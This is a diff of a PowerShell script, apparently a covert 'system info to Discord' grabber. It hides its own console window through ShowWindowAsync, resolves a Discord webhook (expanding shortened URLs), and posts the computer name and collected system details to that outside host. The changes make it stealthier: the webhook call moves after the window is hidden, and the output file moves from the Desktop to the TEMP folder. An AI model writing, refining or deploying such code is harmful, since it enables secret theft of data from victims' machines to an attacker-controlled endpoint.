@@ -1,8 +1,4 @@
 # SYSTEM INFO TO DISCORD
- 
-$hookurl = "$dc"
-# shortened URL Detection
-if ($hookurl.Ln -ne 121){Write-Host "Shortened Webhook URL Detected.." ; $hookurl = (irm $hookurl).url}
 
 $Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
 $Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
@@ -16,6 +12,11 @@ else{
     $hwnd = $Proc.MainWindowHandle
     $Type::ShowWindowAsync($hwnd, 0)
 }
+
+sleep 1
+$hookurl = "$dc"
+# shortened URL Detection
+if ($hookurl.Ln -ne 121){Write-Host "Shortened Webhook URL Detected.." ; $hookurl = (irm $hookurl).url}
 
 $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":computer: ``Gathering System Information for $env:COMPUTERNAME.. Please wait`` :computer:"} | ConvertTo-Json
 Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
@@ -269,7 +270,7 @@ $process
 
 =================================================================================================================================="
 
-$outpath = "$env:USERPROFILE/Desktop/systeminfo.txt"
+$outpath = "$env:TEMP/systeminfo.txt"
 $infomessage | Out-File -FilePath $outpath -Encoding ASCII -Append
 $infomessage1 | Out-File -FilePath $outpath -Encoding ASCII -Append
 $infomessage2 | Out-File -FilePath $outpath -Encoding ASCII -Append
